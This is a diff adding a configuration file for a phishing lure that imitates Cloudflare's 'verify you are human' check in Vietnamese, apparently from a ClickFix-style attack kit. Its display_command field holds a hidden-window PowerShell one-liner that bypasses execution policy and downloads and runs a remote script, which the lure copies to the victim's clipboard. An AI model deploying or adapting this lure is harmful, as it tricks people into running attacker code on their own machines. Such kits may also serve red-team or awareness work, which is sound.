@@ -1,0 +1,20 @@
+# Cloudflare Verification Lure
+# Mimics Cloudflare Turnstile "Verify you are human" page
+
+type: captcha
+template: lures/captcha.html
+route: /xac-minh
+
+payload:
+  script: "default.js"
+
+content:
+  site_name: "secure-login.net"
+  title: "Xác minh bạn là người thật"
+  instructions: "Hoàn tất kiểm tra bảo mật để truy cập trang này."
+  # Command shown in the ClickFix overlay (and copied to clipboard by the payload)
+  display_command: "powershell -w h -ep bypass -c \"IEX (iwr 'http://localhost:8080/api/payloads/default.ps1' -UseBasicParsing).Content\""
+
+styles:
+  theme: "cloudflare"
+  primary_color: "#f6821f"
